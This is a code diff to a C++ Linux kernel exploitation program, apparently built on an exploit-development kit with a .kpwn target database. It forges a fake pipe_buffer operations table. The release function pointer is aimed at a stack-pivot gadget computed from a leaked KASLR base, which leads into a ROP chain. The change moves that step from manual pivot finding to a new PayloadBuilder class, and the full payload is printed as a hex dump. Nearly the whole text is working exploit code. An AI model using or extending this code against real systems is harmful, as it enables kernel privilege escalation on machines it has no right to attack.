@@ -14,6 +14,8 @@
 #include <util/ArgumentParser.cpp>
 #include <rip/RopUtils.cpp>
 #include <pivot/PivotFinder.cpp>
+#include <payloads/PayloadBuilder.h>
+#include <payloads/PayloadBuilder.cpp>
 
 INCBIN(target_db, "target_db.kpwn");
 
@@ -99,12 +101,25 @@ int main(int argc, const char** argv) {
     uint64_t release_offs = offsetof(pipe_buf_operations, release);
     uint64_t fake_ops_offs = offsetof(pipe_buffer, flags) - release_offs;
     payload.Set(offsetof(pipe_buffer, ops), victim_pipe_addr + fake_ops_offs);
-    auto release_ptr = (uint64_t*)payload.Reserve(fake_ops_offs + release_offs, 8);
+    //#define MANUAL 1
+    #ifdef MANUAL
+
+    auto rip_ptr = (uint64_t*)payload.Reserve(fake_ops_offs + release_offs, 8);
 
     PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
     auto rop_pivot = pivot_finder.PivotToRop(rop);
     rop_pivot.PrintDebugInfo();
-    *release_ptr = kaslr_base + rop_pivot.pivot.GetGadgetOffset();
+    *rip_ptr = kaslr_base + rop_pivot.pivot.GetGadgetOffset();
+
+    #else
+    PayloadBuilder builder(target.pivots, kaslr_base); // create builder
+    uint64_t rip_off = fake_ops_offs + release_offs;
+    builder.AddPayload(payload, Register::RSI, rip_off); // add payload, with register, and rip_offset
+    builder.AddRopChain(rop); // add a rop chain
+    if(!builder.build()) exit(-1); // build!
+
+    printf("[+] %s\n", builder.GetDescription().c_str());
+    #endif
 
     printf("[+] Payload:\n");
     HexDump::Print(payload.GetUsedData());
